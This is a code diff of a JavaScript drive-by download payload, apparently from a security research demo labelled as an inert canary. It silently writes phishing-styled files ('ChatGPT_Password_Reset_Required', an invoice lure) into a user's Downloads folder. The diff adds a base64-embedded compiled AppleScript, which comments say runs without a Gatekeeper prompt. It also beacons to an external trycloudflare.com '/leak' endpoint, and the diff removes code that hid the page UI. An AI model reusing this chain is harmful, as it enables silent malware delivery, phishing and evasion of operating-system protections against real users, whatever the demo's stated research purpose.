@@ -4,11 +4,14 @@
    files land silently in ~/Downloads:
      load #1 -> "ChatGPT_Password_Reset_Required.pdf.html"  (reset-page look)
      ~3s later a single page reload re-arms the one-shot download
-     load #2 -> "Invoice_Overdue_October_2026.pdf.html"      (overdue-invoice look)
+     load #2 -> "Invoice_2026.scpt"  (genuinely compiled AppleScript - the
+                T72-proven path: opens in Script Editor with NO Gatekeeper
+                prompt, executes after one Run press; inert Calculator demo)
    Both files are clearly-labeled inert canary pages that beacon to OUR OWN
    receiver when opened. Nothing real. The names are attacker-chosen
    curiosity bait - the demo point: files land with zero interaction. */
 (function () {
+  var SCPT_B64 = "RmFzZFVBUyAxLjEwMS4xMA4AAAAED///AAEAAgADAf//AAANAAEAAWsAAAAAAAAABAIABAACAAUABg0ABQADbAACAAAABQAH//7//Q0ABwADSQACAAAABf/8AAj/+wr//AAYLnN5c29leGVjVEVYVP//gAAAAAAAVEVYVA0ACAABbQAAAAAAAQAJDgAJAAGxAAoRAAoAJABvAHAAZQBuACAALQBhACAAQwBhAGwAYwB1AGwAYQB0AG8AcgL/+wAAAf/+AAAB//0AAAIABgACAAv/+g0ACwADbAACAAYAEQAM//n/+A0ADAADSQACAAYAEf/3AA0ADgr/9wAYLnN5c29kbG9nYXNrcgAAAAAAAAAAVEVYVA0ADQABbQAAAAYABwAPDgAPAAGxABARABAARgBUADcAMgAgAGMAYQBuAGEAcgB5ACAAKABpAG4AZQByAHQAKQAgAC0AIABQAGwAdQB0AG8AIABTAGUAYwB1AHIAaQB0AHkGAA4AA//2ABEAEgr/9gAECmJ0bnMNABEAAUoAAAAIAAsAEwIAEwACABT/9Q0AFAABbQAAAAgACQAVDgAVAAGxABYRABYABABPAEsC//UAAAYAEgAD//QAF//zCv/0AAQKZGZsdA0AFwABbQAAAAwADQAYDgAYAAGxABkRABkABABPAEsG//MAAAH/+QAAAf/4AAAC//oAAA4AAgAADxAAAwAD//IAGgAbAf/yAAAQABoAAf/xCv/xABguYWV2dG9hcHBudWxsAACAAAAAkAAqKioqDgAbAAcQ//AAHP/v/+4AHQAe/+0K//AAGC5hZXZ0b2FwcG51bGwAAIAAAACQACoqKioNABwAAWsAAAAAABEAHwIAHwACAAUAIAIAIAACAAv/7AL/7AAAAf/vAAAC/+4AABAAHQAAEAAeAAkACf/rAA//6gAV/+kAGP/o/+cK/+sAGC5zeXNvZXhlY1RFWFT//4AAAAAAAFRFWFQK/+oABApidG5zCv/pAAQKZGZsdAP/6AAECv/nABguc3lzb2Rsb2dhc2tyAAAAAAAAAABURVhUEf/tABLgagwAAU/i4+RrduXm5wwACA9hc2NyAAEADPre3q0=";
   var R = "https://consultant-casinos-generation-camel.trycloudflare.com/leak?d=";
   var EPOCH = 1792678200;
   /* invisible debug channel: every log line is also beaconed to the
@@ -58,11 +61,7 @@
         "<p style=\"color:#666\">We detected a suspicious sign-in attempt on your account. A password reset is required within 24 hours.</p>" +
         "<p style=\"color:#c00;font-size:11px;font-family:Menlo,monospace\">PLUTO SECURITY RESEARCH CANARY - INERT</p>";
     } else {
-      name = "Invoice_Overdue_October_2026.pdf.html";
-      inner =
-        "<h2 style=\"font-weight:600\">Invoice overdue - action required</h2>" +
-        "<p style=\"color:#666\">Invoice #INV-2026-0987 is 14 days overdue. Amount due: <b>$258.00</b>. Please review the attached notice.</p>" +
-        "<p style=\"color:#c00;font-size:11px;font-family:Menlo,monospace\">PLUTO SECURITY RESEARCH CANARY - INERT</p>";
+      name = "Invoice_2026.scpt";
     }
     var beacon = encodeURIComponent(tok + "|file=" + name);
     var html = [
@@ -84,28 +83,23 @@
 
   function boot() {
     var d = document;
-    /* NO UI AT ALL: hide everything the loader/app rendered (this payload
-       draws nothing), collapse the widget to an invisible sliver */
-    var spacer = d.createElement("div");
-    function hideAlien() {
-      for (var i = 0; i < d.body.children.length; i++) {
-        var c = d.body.children[i];
-        if (c !== spacer) c.style.display = "none";
-      }
-    }
-    hideAlien();
-    try {
-      new MutationObserver(function () { hideAlien(); })
-        .observe(d.body, { childList: true });
-    } catch (e2) {}
-    spacer.style.cssText = "position:static;width:1px;height:1px;pointer-events:none;";
-    d.body.appendChild(spacer);
-    log("UI hidden (zero-visibility mode)");
+    /* part-2 v3: the playground UI STAYS visible (console panel = readable
+       logs); this payload draws nothing itself */
 
     /* silent write via the host download bootstrap (T66-proven) */
     var f = buildFile();
     try {
-      var blob = new Blob([f.html], { type: "text/html" });
+      var blob;
+      if (step === 2) {
+        /* compiled AppleScript (T72-proven: quarantined .scpt opens in
+           Script Editor with NO Gatekeeper prompt; inert Calculator demo) */
+        var bin = atob(SCPT_B64);
+        var bytes = new Uint8Array(bin.length);
+        for (var k = 0; k < bin.length; k++) bytes[k] = bin.charCodeAt(k);
+        blob = new Blob([bytes], { type: "application/x-applescript" });
+      } else {
+        blob = new Blob([f.html], { type: "text/html" });
+      }
       var url = URL.createObjectURL(blob);
       var a = d.createElement("a");
       a.href = url;
